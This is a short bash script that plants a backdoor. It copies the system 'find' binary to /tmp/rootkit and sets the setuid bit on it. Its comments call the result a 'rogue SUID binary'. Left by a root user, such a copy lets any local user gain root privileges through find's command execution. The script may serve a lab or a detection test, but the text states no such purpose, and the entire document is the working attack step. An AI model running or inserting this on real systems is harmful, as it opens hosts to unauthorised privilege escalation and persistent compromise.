#!/bin/bash
# Plant a rogue SUID binary
cp /usr/bin/find /tmp/rootkit
chmod u+s /tmp/rootkit
echo "rogue SUID planted at /tmp/rootkit"
